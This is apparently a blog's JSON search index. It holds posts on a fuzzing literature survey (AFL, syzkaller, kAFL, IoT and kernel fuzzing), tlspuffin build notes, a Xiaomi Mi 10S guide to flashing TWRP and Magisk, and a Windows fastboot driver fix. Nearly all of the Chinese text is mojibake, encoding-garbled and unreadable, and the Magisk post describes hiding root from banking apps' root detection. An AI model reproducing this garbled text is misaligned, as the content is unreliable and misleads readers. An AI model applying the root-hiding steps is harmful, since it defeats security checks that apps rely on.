å…·ä½“çš„æŒ‘æˆ˜æ˜¯å¦‚ä½•åœ¨å°½é‡æ»¡è¶³è¯­æ³•è¯­ä¹‰æ£€æŸ¥çš„æƒ…å†µä¸‹,çŸ­æ—¶é—´å†…ç”Ÿæˆ å¤§é‡çš„è¾“å…¥,ç”¨ä»¥å¯¹ç›®æ ‡åšå…¨é¢è€Œæ·±å…¥åˆ†æï¼ é¦–å…ˆå¾—åˆ°ä¸€ä¸ªæ•°æ® $S$ ,ç„¶åæ•°æ® $S$ æŒ‰ç…§ä¸€ å®šçš„ç­–ç•¥è¿›è¡Œä¸€å®šæ¬¡æ•°çš„å˜å¼‚,è·å¾—å¤§é‡æ–°æ•°æ® $I$ , æœ€åå°†$I$è¾“å…¥åˆ°è¢«æµ‹è¯•å¯¹è±¡ä¸­è¿›è¡Œæµ‹è¯•ï¼å…¶ä¸­æ•°æ® $S$ è¢«ç§°ä¸ºç§å­(seed), $I$ æ˜¯æµ‹è¯•å®é™…ä½¿ç”¨çš„è¾“å…¥æ•°æ® è¯„ä¼° ç°é˜¶æ®µçš„ç ”ç©¶éƒ½ä¼šèšç„¦äºæ¨¡ç³Šæµ‹è¯•å™¨åœ¨ï¼’ä¸ªæŒ‡æ ‡ä¸Šçš„è¡¨ç°:è¦†ç›–ç‡å’Œæš´éœ²æ¼æ´å¹³å‡æ—¶é—´ è¦†ç›–ç‡æ˜¯è½¯ä»¶æµ‹è¯•ä¸­çš„ä¸€ä¸ªè¡¡é‡æŒ‡æ ‡,æŒ‡çš„æ˜¯åœ¨æµ‹è¯•è¿‡ç¨‹ä¸­,å¯¹è±¡è¢«è¦†ç›–åˆ°çš„æ•°ç›®å æ€»æ•°çš„æ¯”ä¾‹ï¼ é€šå¸¸è€Œè¨€,é«˜è¦†ç›–ç‡æ›´å¯èƒ½å‘ç°æ›´å¤šçš„éšè—æ¼æ´,ä¼—å¤šç ”ç©¶å› æ­¤é›†ä¸­åœ¨è¦†ç›–ç‡æå‡ä¸Š AFL ä½¿ç”¨ä¸Šä¸‹æ–‡æ— å…³çš„è¾¹è¦†ç›–ç‡ä½œä¸ºè¯„ä¼°æŒ‡æ ‡ï¼ [13] Angora ä½¿ç”¨ä¸Šä¸‹æ–‡æ•æ„Ÿçš„åˆ†æ”¯è¦†ç›–ç‡ï¼[42] VUzzer ä½¿ç”¨äº†å—è¦†ç›–ç‡æ›¿ä»£è¾¹è¦†ç›–ç‡ä½œä¸ºè¦†ç›–ç‡è¯„ä¼°çš„å¯¹è±¡ï¼[41] æš´éœ²æ¼æ´å¹³å‡æ—¶é—´: æš´éœ² æ¼ æ´ å¹³ å‡ æ—¶ é—´ è¢« BÃ¶hmeï¼”ï¼–] AFLGo é€‰ åš è¯„ ä¼° æŒ‡ æ ‡ï¼åœ¨ ä¸ åŸº å‡† æ¨¡ ç³Š å·¥ å…· [ï¼”ï¼–] AFL çš„å¯¹æ¯”å®éªŒä¸­,AFLGo å¤ç°å•ä¸ªæ¼æ´çš„ [ï¼‘ï¼“] [ï¼”ï¼–] æ—¶é—´è¿œæ¯”AFLå°‘,è¿™è¯æ˜äº†è¯¥è¯„ä¼°æŒ‡æ ‡çš„æœ‰æ•ˆæ€§ï¼ æ­¤åHawakeye[ï¼”ï¼—] åŒæ ·ä½¿ç”¨äº†è¿™ä¸€æŒ‡æ ‡æ¥è¯æ˜å…¶æ€§ èƒ½ï¼Parmesan åœ¨é€šè¿‡sanitizeræ¥å‘ç°æ½œåœ¨æ¼æ´çš„ [ï¼–ï¼“] ç ”ç©¶å·¥ä½œä¸­,ä¹Ÿæ˜¯ç”¨æš´éœ²æ¼æ´å¹³å‡æ—¶é—´ä½œä¸ºè¯„ä¼°æŒ‡ æ ‡åŒAngora [ï¼”ï¼’] ç­‰å®šå‘ç°ç›’æ¨¡ç³Šå·¥å…·è¿›è¡Œæ¯”è¾ƒ ç»“æœåˆ†æ ç»“æœåˆ†æå‘ç”Ÿåœ¨æ¨¡ç³Šæµ‹è¯•ç»“æŸä»¥å,ä¸»è¦ç›®çš„æ˜¯å¯¹äºæ¨¡ç³Šæµ‹è¯•çš„è¾“å‡ºä¿¡æ¯è¿›è¡Œåˆ†æå’Œå¤„ç† å…·ä½“åº”ç”¨åœºæ™¯ä¸‹çš„æ¨¡ç³Šæµ‹è¯• ç‰©è”ç½‘ä¸­çš„æ¨¡ç³Šæµ‹è¯• ä¸»è¦é¢ä¸´ä¸¤ä¸ªé—®é¢˜: å°†æ¨¡ç³Šæµ‹è¯•åº”ç”¨åˆ°ç‰©è”ç½‘é¢†åŸŸé—®é¢˜å°±æ˜¯ç‰¹å®šç‰©è”ç½‘è®¾å¤‡ä¸Šè¿è¡Œçš„ç¨‹åºé€šå¸¸å¯¹äºå…¶å®é™…ç¡¬ä»¶çš„é…ç½®æœ‰ç€é«˜åº¦çš„ä¾èµ–æ€§ï¼ â€‹ ç®€å•çš„ä»å›ºä»¶ä¸­æå–ä¸€ä¸ªç”¨æˆ·çº§åˆ«çš„ç¨‹åº,ç„¶åä½¿ç”¨æ¨¡ç³Šæµ‹è¯•è¿›è¡Œæ£€æµ‹,é€šå¸¸æ˜¯è¡Œä¸é€šçš„ Iot-Fuzzer[ï¼“ï¼] è®¤ä¸ºå¤§å¤šæ•°ç‰©è”ç½‘è®¾å¤‡é€šè¿‡å…¶å®˜æ–¹ç§»åŠ¨åº”ç”¨ç¨‹åºè¿›è¡Œæ§åˆ¶,å¹¶ä¸”æ­¤ç±»åº”ç”¨ç¨‹åºé€šå¸¸åŒ…å«æœ‰ä¸è®¾å¤‡è¿›è¡Œé€šä¿¡æ‰€ä½¿ç”¨åè®®çš„ä¸°å¯Œä¿¡æ¯,å› æ­¤é€šè¿‡è¯†åˆ«å’Œé‡ç”¨ç‰¹å®šäºç¨‹åºçš„é€»è¾‘(æ¯”å¦‚åŠ å¯†)æ¥æ”¹å˜æµ‹è¯•ç”¨ä¾‹(å°¤å…¶æ˜¯æ¶ˆæ¯å­—æ®µ),å°±èƒ½å¤Ÿæœ‰æ•ˆåœ°å¯¹ç‰©è”ç½‘ç›®æ ‡è¿›è¡Œæ¨¡ç³Šæµ‹è¯•,è€Œæ— éœ€ä¾èµ–äºæœ‰å…³å…¶åè®®è§„èŒƒçš„ä»»ä½•çŸ¥è¯†ï¼ ç‰©è”ç½‘è®¾å¤‡è¿œè¿œæ— æ³•æ»¡è¶³æ¨¡ç³Šæµ‹è¯•éœ€è¦çš„ååç‡ å¤šé¡¹ç ”ç©¶æˆæœè¡¨æ˜ç‰©è”ç½‘è®¾å¤‡é‡‡ç”¨å…¨ä»¿çœŸçš„ç³»ç»Ÿ,å¯ä»¥è·å¾—æœ€é«˜çš„ååé‡,è¿™æ˜¯å› ä¸ºçœŸå®çš„ç‰©è”ç½‘è®¾å¤‡ç›¸æ¯”äºæ¡Œé¢å·¥ä½œç«™æˆ–è€…æœåŠ¡å™¨è¦æ…¢å¾—å¤š å†…æ ¸å®‰å…¨ä¸­çš„æ¨¡ç³Šæµ‹è¯• å†…æ ¸æ¨¡ç³Šæµ‹è¯•é€šå¸¸åˆ©ç”¨æš´éœ²å‡ºæ¥çš„ç³»ç»Ÿè°ƒç”¨æ¥å£å’Œå¤–å›´æ¥å£,ä»ç”¨æˆ·ç©ºé—´è¿›å…¥åˆ°å†…æ ¸ç»„ä»¶ä¸­è¿›è¡Œæ¨¡ç³Šæµ‹è¯•,ä»¥æ£€æµ‹å†…æ ¸ä¸­å¯èƒ½å­˜åœ¨çš„æ¼æ´ ä¸»è¦é¢ä¸´çš„é—®é¢˜: Windowså†…æ ¸ç¨‹åºä»¥åŠå¾ˆå¤šç›¸å…³ç»„ä»¶çš„æºä»£ç å¹¶ ä¸å¼€æº,å°†å¯¼è‡´ä¼ ç»Ÿçš„åé¦ˆæœºåˆ¶ä¸å†é€‚ç”¨ï¼ å†…æ ¸ä¸­çš„ä»£ç ç”±äºå­˜åœ¨ä¸­æ–­ã€å¤šçº¿ç¨‹æ“ä½œç­‰æœºåˆ¶,ä½¿å¾—æ¨¡ç³Šæµ‹è¯•å˜çš„å¾ˆå¤æ‚ï¼ å†…æ ¸æ¨¡ç³Šæµ‹è¯•ä¸€æ—¦æ£€æµ‹åˆ°ç¨‹åºçš„å´©æºƒ,å°†ä¼šå¯¼è‡´æ•´ä¸ªæ“ä½œç³»ç»Ÿé‡æ–°å¯åŠ¨,æå¤§åœ°å½±å“äº†æ¨¡ç³Šæµ‹è¯•çš„æ•ˆç‡ï¼ ä¸ºäº†å…‹æœè¿™äº›é—®é¢˜,äº§ç”Ÿäº†ä¸€äº›ä¸“é—¨é’ˆå¯¹å†…æ ¸å®‰å…¨è¿›è¡Œæ¨¡ç³Šæµ‹è¯•çš„ç ”ç©¶, æ¯”å¦‚syzkaller [ï¼—ï¼] æ˜¯ç”±Googleå¼€å‘çš„ä¸€ç§ä»¥è·å¾—é«˜è¦†ç›–ç‡ä¸ºå¯¼å‘çš„å†…æ ¸ æ¨¡ç³Šæµ‹è¯•å·¥å…·,ç›®å‰å®é™…ä½¿ç”¨æ¯”è¾ƒå¤š,å¹¶ç»å¸¸è¢«ç”¨äºå¯¹æ¯”å®éªŒä¸­ï¼ Razzer[ï¼—ï¼‘] æ˜¯åŸºäºsyzkaller [ï¼—ï¼] é€šè¿‡ä½¿ç”¨LLVMå’Œä¿®æ”¹åçš„SVFæŠ€æœ¯é’ˆå¯¹å†…æ ¸ä¸­å­˜åœ¨çš„æ•°æ®äº‰ç”¨é—®é¢˜è¿›è¡Œçš„æ¨¡ç³Šæµ‹è¯• TriforceAFL[ï¼“ï¼–] AFL [ï¼‘ï¼“]çš„QEMUæ¨¡å¼,åœ¨ç³»ç»Ÿæ¨¡æ‹Ÿå™¨çš„å¸®åŠ©ä¸‹,é€šè¿‡è·Ÿè¸ªåˆ†æ”¯ä¿¡æ¯,å¯¹Linuxçš„å†…æ ¸è¿›è¡Œæ¨¡ç³Šæµ‹è¯•ï¼ kAFL[ï¼“ï¼—] é€šè¿‡åˆ©ç”¨Intelæä¾›çš„è¿›ç¨‹è¿½è¸ªæŠ€æœ¯,è·å–ä»£ç è¿è¡Œæ—¶çš„æ§åˆ¶æµä¿¡æ¯,å¹¶é€šè¿‡ä½¿ç”¨Intelçš„ç¡¬ä»¶ è™šæ‹Ÿç‰¹å¾(VTï¼§x)æå‡æ•ˆç‡å¹¶ä½¿å¾—kAFL[ï¼“ï¼—] ç‹¬ç«‹äºç‰¹å®šçš„æ“ä½œç³»ç»Ÿ ä¼ ç»Ÿçš„æ¨¡ç³Šæµ‹è¯•åº”ç”¨åˆ°å†…æ ¸æ¨¡ç³Šæµ‹è¯•ä¸Šå°†é¢ä¸´ç€ä¼—å¤šçš„é—®é¢˜,åŒ… æ‹¬å†…æ ¸æ€ä»£ç çš„å¤æ‚æ‰§è¡Œç¯å¢ƒ,ä»¥åŠå†…æ ¸å´©æºƒçš„å¤„ ç†é—®é¢˜ï¼å¦å¤–å†…æ ¸å®‰å…¨é¢ä¸´çš„å¨èƒæ¥æºæ˜¯ä¸ç¡®å®šçš„, å¯ä»¥æ˜¯å¤–éƒ¨å›ºä»¶,ä¹Ÿå¯ä»¥æ˜¯ç¬¬ä¸‰æ–¹å¼€å‘çš„é©±åŠ¨ç¨‹åº, è¿˜å¯ä»¥æ˜¯å†…æ ¸ç¨‹åºè‡ªèº«è®¾è®¡çš„é—®é¢˜ï¼æ¨¡ç³Šæµ‹è¯•åœ¨å†… æ ¸å®‰å…¨é¢†åŸŸçš„åº”ç”¨è¿˜æœ‰å¾…è¿›ä¸€æ­¥çš„ç ”ç©¶ï¼ é™æ€åˆ†ææˆ–æ¨¡ç³Šæ£€æµ‹æŠ€æœ¯é€šå¸¸å¯¹å†…å­˜æº¢å‡ºç­‰æ¼æ´æœ‰æ•ˆ,è€Œæ— æ³•æŒ–æ˜åè®®å®ç°åº“çš„é€»è¾‘æ¼æ´. é€šè¿‡æå–å®‰å…¨åè®®å®ç°çš„çŠ¶æ€æœº,èƒ½å¤Ÿå®ç°å¯¹åè®®å®ç°çš„å½¢å¼åŒ–å»ºæ¨¡.","categories":[{"name":"Master","slug":"Master","permalink":"https://www.sizaif.com/navigation/categories/Master/"},{"name":"è®ºæ–‡","slug":"Master/è®ºæ–‡","permalink":"https://www.sizaif.com/navigation/categories/Master/%E8%AE%BA%E6%96%87/"}],"tags":[{"name":"fuzzing","slug":"fuzzing","permalink":"https://www.sizaif.com/tags/fuzzing/"},{"name":"è®ºæ–‡","slug":"è®ºæ–‡","permalink":"https://www.sizaif.com/tags/%E8%AE%BA%E6%96%87/"}],"author":"sizaif"},{"title":"Tlspuffin-Docker:changelog","slug":"tlspuffin-docker-changelog","date":"2022-03-15T03:02:38.000Z","updated":"2022-03-15T03:12:24.758Z","comments":true,"path":"posts/95953aea/","link":"","permalink":"https://www.sizaif.com/posts/95953aea/","excerpt":"","text":"1.6.0 ä¿®å¤deps/rust-openssl-src æ–‡ä»¶æƒé™util/dmod æƒé™é—®é¢˜ä¿®å¤ makedepend: not foundapt-get install xutils-devä¿®æ”¹ä¸»ç‰ˆæœ¬å·puståˆ°dcokerhubç¨³å®šç‰ˆæœ¬ 1.3.0 - 1.5.0 ä¿®å¤ç¼–è¯‘é”™è¯¯ 1.2.0 å¢åŠ openssl1.01fçš„ä¾èµ– 1.1.0 å¢åŠ openssl1.01fæ”¯æŒ 1.0.0 ç§»æ¤åˆ°dockerä¸­åˆå§‹src","categories":[{"name":"Master","slug":"Master","permalink":"https://www.sizaif.com/navigation/categories/Master/"},{"name":"è®ºæ–‡","slug":"Master/è®ºæ–‡","permalink":"https://www.sizaif.com/navigation/categories/Master/%E8%AE%BA%E6%96%87/"}],"tags":[{"name":"Master","slug":"Master","permalink":"https://www.sizaif.com/tags/Master/"}],"author":"sizaif"},{"title":"Tlspuffin åˆ‡æ¢LUTç‰ˆæœ¬","slug":"tlspuffin-åˆ‡æ¢LUTç‰ˆæœ¬","date":"2022-03-04T13:03:48.000Z","updated":"2022-03-15T03:04:21.229Z","comments":true,"path":"posts/ed5ef6e5/","link":"","permalink":"https://www.sizaif.com/posts/ed5ef6e5/","excerpt":"","text":"è¯´æ˜ å½“å‰çš„ç¼ºé™· åªæœ‰openssl1.1.1k å’Œlibresslï¼ˆå­˜ç–‘) æ”¯æŒSecurity Violation Oracle æ–‡çŒ®8.2.2èŠ‚ Improved Security Violation Oracle In Section 5.2 we designed a bug oracle which is able to check security properties. Right now we only check after successful handshakes whether no security violation happened. For example whether a downgrade or authentication bypass happened. This could be extended by also verifying invariants during the execution of a handshake. That way we could for example detect the FREAK vulnerability automatically. Furthermore, the security violation oracle could also be extended to other TLS implementations. Right now only OpenSSL 1.1.1k is supported. Support for checking security violations could be ported to LibreSSL 3.3.3 and backported to OpenSSL 1.0.x. é‚£ä¹ˆåˆ‡æ¢åˆ°å…¶ä»–ç‰ˆæœ¬çš„æ—¶å€™ï¼Œæš‚æ—¶ä¸èƒ½ä½¿ç”¨Oracle depsçš„å…³ç³» Tlspuffin é¡¶å±‚ Cargo.tomlä¸­å®šä¹‰ featuresä¸­opensslç‰ˆæœ¬, ä»¥åŠä¾èµ–rust-openssl/openssl rust-openssl/openssl Cargo.tomlä¸­å®šä¹‰vendored-opensslç‰ˆæœ¬ï¼Œä»¥åŠä¾èµ–openssl-sys openssl-sys Cargo.tomlä¸­å®šä¹‰ç»†åŒ–çš„vendored-opensslç‰ˆæœ¬ï¼Œä»¥åŠä¾èµ–openssl-srs åŠŸèƒ½: cfgå®šä¹‰å¯¹åº”çš„opensslç‰ˆæœ¬ç»‘å®š è·¯å¾„: src&#x2F;openssl_binding.rs&#x2F;fn create_openssl_server åŠŸèƒ½: å®šä¹‰featureså¯¹åº”çš„ç‰ˆæœ¬æºç ä½ç½® è·¯å¾„: deps&#x2F;rust-openssl-src&#x2F;src&#x2F;lib.rs&#x2F;fn source_dir æ­¥éª¤ rust-openssl-src æ–‡ä»¶å­˜æ”¾ opensslçš„å„ç‰ˆæœ¬æºç  ä¿®æ”¹Tlspuffin é¡¶å±‚Cargo.toml æ·»åŠ ç‰ˆæœ¬åç§° æ ¹æ®ä¾èµ–ä¾æ¬¡æ·»åŠ ç‰ˆæœ¬ä¿¡æ¯ åœ¨ä¸¤ä¸ªè·¯å¾„æ–‡ä»¶ä¸­æ·»åŠ å¯¹åº”çš„ä¿¡æ¯ ç¼–è¯‘å…¶ä»–ç‰ˆæœ¬ æ–¹å¼ä¸€ï¼š ä¿®æ”¹ é¡¶å±‚Cargo.toml æ–‡ä»¶ä¸­ [features] é¡¹ä¸­ default å‚æ•° [features] default = [\"sancov_libafl\", \"openssl111j\", \"introspection\"] æ–¹å¼äºŒï¼š ä½¿ç”¨cargo å‘½ä»¤ æ·»åŠ å‚æ•° $ cargo run --no-default-features --features openssl102u,sancov_libafl,introspection sancov_libafl,introspection å¿…é¡»é¡¹","categories":[{"name":"Master","slug":"Master","permalink":"https://www.sizaif.com/navigation/categories/Master/"},{"name":"è®ºæ–‡","slug":"Master/è®ºæ–‡","permalink":"https://www.sizaif.com/navigation/categories/Master/%E8%AE%BA%E6%96%87/"}],"tags":[{"name":"Master","slug":"Master","permalink":"https://www.sizaif.com/tags/Master/"}],"author":"sizaif"},{"title":"Miui13-mi10såˆ·twrpå’ŒMagisk","slug":"Miui13-mi10såˆ·twrpå’ŒMagisk","date":"2022-03-01T10:20:02.000Z","updated":"2022-03-08T15:12:16.467Z","comments":true,"path":"posts/9d7955fe/","link":"","permalink":"https://www.sizaif.com/posts/9d7955fe/","excerpt":"","text":"å‰è¨€ å¾…æ‰‹æœºè§£é”BLé”å, å°è¯•å¼€å§‹åˆ·æœº ç›®æ ‡: åˆ·SkyMiæ˜Ÿç©ºåŒ…-miui13 å®˜æ”¹åŒ…é«˜çº§åŒ… åˆ·å…¥Magisk v24.1é¢å…· ä»¥åŠEDXP,å®ç°ç»•è¿‡ROOTæ£€æµ‹ æ­¥éª¤ è§£BLé” å‰ææ¡ä»¶ æ‰‹æœºä¸è´¦å·ç»‘å®š168h ç”µè„‘å®‰è£…å¥½ç›¸åº”çš„adbé©±åŠ¨ ç”µè„‘å®‰è£…å¥½mifashé©±åŠ¨ è¿æ¥æ‰‹æœºï¼Œæ‰‹æœºè®¾ç½®usbè°ƒè¯•å, å¼€å¯OEMè°ƒè¯• åœ¨platform-toolsç›®å½•ä¸‹ å…ˆæŸ¥çœ‹æ˜¯å¦è¿æ¥æˆåŠŸ $./adb.exe devices è¿›å…¥fastbootæ¨¡å¼ $./adb.exe reboot bootloader ç”µè„‘è¿›å…¥miflash ç™»å½•è´¦å·åè¿›è¡Œè§£é” åˆ·å…¥Twrp å‰ææ¡ä»¶ BLå·²è§£é” éœ€è¦PC /ç¬”è®°æœ¬ç”µè„‘å’ŒUSBæ•°æ®çº¿ ç”µè„‘å®‰è£…å¥½ç›¸åº”çš„adbé©±åŠ¨ ç”µè„‘å®‰è£…å¥½mifashé©±åŠ¨ æå‰ä¸‹è½½å¥½å¯¹åº”çš„Twrpç‰ˆæœ¬ æå‰åšå¥½å¤‡ä»½ æ‰‹æœºæœ‰è¶³å¤Ÿçš„ç”µé‡ USB Drivers: Xiaomi USB Drivers Download ADB and Fastboot and install them on your PC TWRP Recovery Details File Name TWRP Recovery Version 3.6.0 Support Unofficial Developer TheRomFan è¿æ¥æ‰‹æœºï¼Œæ‰‹æœºè®¾ç½®usbè°ƒè¯•å,å¼€å¯OEMè°ƒè¯• åœ¨platform-toolsç›®å½•ä¸‹ è¿›å…¥fastbootæ¨¡å¼ $./adb.exe reboot bootloader æŸ¥çœ‹fastbootè®¾å¤‡ä¿¡æ¯ $./fastboot.exe devices Devices with A/B partition scheme twrp.imgä¸ºä¸‹è½½çš„twrpåç§° åˆ·å…¥boot ï¼Œ ä¸´æ—¶è¿›å…¥twrp $./fastboot.exe boot twrp.img å°†twrp.imgæ–‡ä»¶å¤åˆ¶åˆ°è®¾å¤‡ $ ./adb.exe push twrp.img /sdcard è¿›å…¥åˆ°twrpä¸­ $./fastboot.exe oem reboot-recovery é€‰æ‹© Install Recovery Ramdisk é€‰æ‹©åˆšåˆšå¤åˆ¶è¿›å»çš„twrp.img é‡å¯recovery å®‰è£…Magisk magisk rootæƒé™çš„æ­£ç¡®è·å¾—æ–¹æ³•æ˜¯ä¿®è¡¥ä½ ç›®å‰ç³»ç»Ÿçš„bootï¼Œå†é€šè¿‡ç”µè„‘adbå‘½ä»¤åˆ·å…¥ä¿®è¡¥åçš„bootã€‚ é”™è¯¯æ–¹æ³•: å…ˆè·å¾—å®˜æ–¹rootæƒé™ï¼Œå†ç»™magisk manageræƒé™æ¥è®©å…¶ç›´æ¥åˆ·å…¥magiskæ¥è·å¾—rootæƒé™ã€‚ é¦–å…ˆè¦æœ‰ä¸€ä¸ªæ¦‚å¿µï¼Œå°ç±³11ï¼ˆåæ–‡å‡ä»£æŒ‡å‡ºå‚å°±æ˜¯å®‰å“11ï¼‰çš„æ‰‹æœºä¸ä¹‹å‰çš„å°ç±³/çº¢ç±³æ˜¯ä¸ä¸€æ ·çš„ï¼ˆå“ªæ€•åæ¥ä»10å‡çº§äº†å®‰å“11ï¼‰ï¼Œå°ç±³11ä½¿ç”¨çš„æ˜¯V a/bçš„åˆ†åŒºå½¢å¼ã€‚ä¸åŒäºå…¶ä»–æ‰‹æœºï¼Œå…¶ä»–æ‰‹æœºçš„å¯åŠ¨æµç¨‹å›¾å¯ä»¥å¤§è‡´å‚è€ƒä¸€ä¸‹ æ‹¿åˆ°boot.img æ–°ç‰ˆæœ¬éœ€è¦å…ˆè§£å‹payload.binï¼Œç„¶åéœ€è¦ä¸€ä¸ªå·¥å…·æ¥äºŒæ¬¡è§£åŒ…å·¥å…·åœ¨è¿™é‡Œ aili.lanzoux.com/ii2lkkp079gå¯†ç :5b8x) è¿™ä¸ªå·¥å…·å¾ˆç®€å•ï¼ŒåŒ…é‡Œä¹Ÿæœ‰readmeï¼Œå¤§æ¦‚æ„æ€å°±æ˜¯æŠŠpayload.binæ”¾å…¥inputï¼Œè¿è¡Œexeï¼Œåˆ°outputå»æ‰¾è§£å‹å‡ºçš„boot.imgåŒ…å°±è¡Œ æ‰‹æœºä¸Šå®‰è£…Magisk Manager å°†åˆšåˆšæå–åˆ°çš„boot.imgç§»åˆ°æ‰‹æœºé‡Œï¼Œæ‰“å¼€æ¢¯æˆ–è€…æ›´æ”¹é¢å…·çš„è‡ªå®šä¹‰é€šé“ï¼Œ ç„¶åå›åˆ°ä¸»ç•Œé¢é€‰æ‹©Magiskçš„å®‰è£… Magiskå®‰è£… æ­¤å¤„é€‰æ‹©å¹¶ä¿®è¡¥ä¸€ä¸ªæ–‡ä»¶ï¼Œé€‰æ‹©åˆ°åˆšåˆšç§»å…¥æ‰‹æœºçš„boot.imgï¼Œç­‰å¾…ä¿®è¡¥å®Œæˆï¼Œåœ¨åŒç›®å½•ä¸‹ä¼šç”Ÿæˆboot_patch.imgæ–‡ä»¶ã€‚ æ­¤å¤„ä¸å¯é€‰æ‹©ç›´æ¥å®‰è£…ï¼ˆæ¨èï¼‰ï¼ŒåŸå› åé¢ä¼šè¯´ å°†è¿™ä¸ªä¿®è¡¥çš„boot_patch.imgç§»å›ç”µè„‘ã€‚å¼€å§‹çº¿åˆ·ï¼Œ $fastboot flash boot_a boot_patched.img $fastboot flash boot_b boot_patched.img ä¸ºä»€ä¹ˆé¢å…·ä¸èƒ½é€‰æ‹©ç›´æ¥å®‰è£…ï¼ˆæ¨èï¼‰ï¼Ÿ å¦‚æœä½ æå‰å·²ç»è·å–äº†å®˜æ–¹Rootï¼Œè¿™ä¸€æ­¥ä½ å½“ç„¶å¯ä»¥æ­£å¸¸è¿è¡Œå¹¶ä¸”åˆ·å¥½é¢å…·ã€‚ä½†ä¸ºäº†ç»•è¿‡é“¶è¡Œç­‰APPRootæ£€æµ‹ï¼Œä½¿çš„Magiskhideæ­£å¸¸å‘æŒ¥ä½œç”¨ã€‚ä½¿ç”¨å®˜æ–¹Rootè·å–åˆ°é¢å…·ï¼Œé¢å…·æ¥ç®¡äº†ä½ çš„å®˜æ–¹Rootï¼Œå½“ä½ ä½¿ç”¨hideæ—¶ï¼Œé¢å…·çš„Rootè¢«éšè—äº†ï¼Œå®˜æ–¹çš„Rootå°±æ¢å¤äº†ï¼ˆå¯¹è¯¥åº”ç”¨ï¼‰ã€‚æ‰€ä»¥åº”ç”¨èƒ½æ£€æµ‹å‡ºRootï¼Œè€Œä¸”å¾ˆéš¾å†æŠŠå®˜æ–¹Rootå»éšè—ã€‚æœ¬æ•™ç¨‹å‹æ ¹å°±ä¸åˆ·å®˜æ–¹Rootç›´æ¥è·å–é¢å…·Rootï¼Œæ‰€ä»¥Magiskhideèƒ½æ­£å¸¸å‘æŒ¥ä½œç”¨ï¼ˆå¹¶ä¸”å¤§å¤šæ•°æƒ…å†µæ˜¯ç»å¯¹å¤Ÿç”¨çš„ï¼‰ã€‚ ä½ å½“ç„¶ä¹Ÿèƒ½å†åˆ·ä¸€ä¸ªæŸæŸé“¶è¡Œå»Rootçš„æ¨¡å—ï¼Œä½†æ˜¯ä¸éº»çƒ¦ä¹ˆï¼Ÿæ˜æ˜è‡ªå¸¦çš„è…¿å°±èƒ½å‘æŒ¥ä½œç”¨ï¼Œä½ å…ˆç æ–­ä»–çš„è…¿åœ¨ç»™ä»–æ¥ä¸Šï¼Œè¿™ä¸æ˜¯å¤šæ­¤ä¸€ä¸¾ï¼Ÿè€Œä¸”æ¨¡å—è¶Šå¤šç¨³å®šæ€§å•Šè½¯ä»¶æ›´æ–°å•Šéƒ½æ˜¯é—®é¢˜ã€‚ä¸€åŠ³æ°¸é€¸çš„æ–¹æ³•ä¸å¥½ä¹ˆï¼Ÿ Magisk éšè—ç”Ÿæ•ˆ [å¡«å‘] æ˜Ÿç©ºROMåŒ… ç»è¿‡æµ‹è¯•åï¼Œ æ˜Ÿç©ºé›†æˆçš„ROMåŒ…ä¸Twrpæ— æ³•åŒæ—¶å­˜åœ¨ åˆ·å…¥Twrpåï¼Œ ä½¿ç”¨Twrpå¡åˆ·ROMåï¼Œtwrpä¼šè‡ªåŠ¨å›æ»šæˆå®˜æ–¹recovery æ²¡åˆ·å†…æ ¸çš„åŸå› ã€‚ æ˜Ÿç©ºROMè‡ªåŠ¨çº¿åˆ·å¡åˆ·ä¸¤ç§æ–¹å¼ï¼Œé›†æˆMagiskã€‚ æ‰€ä»¥æ²¡æœ‰å¿…è¦ä½¿ç”¨Twrp å‰æï¼š å®‰è£…å¥½usbé©±åŠ¨ å®‰è£…å¥½adbå‘½ä»¤ ä¸´æ—¶ä½¿ç”¨Twrpæ–¹å¼ï¼š $./fastboot.exe boot twrp.img è¿›å…¥Twrp $./fastboot.exe oem reboot-recovery","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Win","slug":"æŠ€æœ¯å‘/Win","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Win/"}],"tags":[{"name":"fastboot","slug":"fastboot","permalink":"https://www.sizaif.com/tags/fastboot/"},{"name":"é©±åŠ¨","slug":"é©±åŠ¨","permalink":"https://www.sizaif.com/tags/%E9%A9%B1%E5%8A%A8/"},{"name":"miflash unlock","slug":"miflash-unlock","permalink":"https://www.sizaif.com/tags/miflash-unlock/"}],"author":"sizaif"},{"title":"è§£å†³Win10 Fastbooté©±åŠ¨é—®é¢˜","slug":"è§£å†³win10-fastbooté©±åŠ¨é—®é¢˜","date":"2022-03-01T09:30:15.000Z","updated":"2022-03-01T09:51:33.000Z","comments":true,"path":"posts/c1ff5c7b/","link":"","permalink":"https://www.sizaif.com/posts/c1ff5c7b/","excerpt":"","text":"å‰è¨€ å°ç±³æ‰‹æœºè§£é”BL, ä½¿ç”¨ä»å®˜ç½‘ä¸‹è½½çš„è§£é”å·¥å…· (miflash_unlock-6.5.224.28 ç‰ˆæœ¬è‡ªèº«ä¸å¸¦win10 é©±åŠ¨)å¯¼è‡´å‡ºç°å³ä½¿è¿æ¥æ‰‹æœºåä¹Ÿæ˜¾ç¤º: å½“å‰æœªè¿æ¥æ‰‹æœº è§£å†³æ–¹æ³• ä¸‹è½½é©±åŠ¨: google_latest_usb_driver_windows è§£å‹åç›®å½•ä¸‹æœ‰ä¸ª: android_winusb.inf æ–‡ä»¶ æ‰“å¼€è®¾å¤‡ç®¡ç†å™¨ å…¶ä»–è®¾å¤‡é‡Œæ‰¾åˆ° Androidç±»ä¼¼å¸¦æœ‰!ä¸æ­£å¸¸é©±åŠ¨ æ›´æ–°é©±åŠ¨ç¨‹åº-&gt;æµè§ˆæˆ‘çš„è®¡ç®—æœºä»¥æŸ¥æ‰¾é©±åŠ¨ç¨‹åº è®©æˆ‘ä»è®¡ç®—æœºä¸Šçš„å¯ç”¨é©±åŠ¨ç¨‹åºåˆ—è¡¨é€‰å–-&gt;ä¸‹ä¸€æ­¥-&gt;ä»ç£ç›˜å®‰è£… é€‰æ‹©ä»ç£ç›˜å®‰è£… é€‰æ‹©android_winusb.infæ–‡ä»¶ ä¸‹ä¸€æ­¥å®‰è£…ç­‰å¾…å®‰è£…å®Œæˆåå³å¯ åˆ·æ–°å…¶ä»–è®¾å¤‡, é©±åŠ¨å˜çš„å¯ç”¨å¦‚å›¾ å®‰è£…ADB platform-tools_r31.0.3-windows.zip æ‰‹æœºå¼€å‘è€…é€‰é¡¹é‡Œè®¾ç½® USB è°ƒè¯•, OEMå¯åŠ¨ å 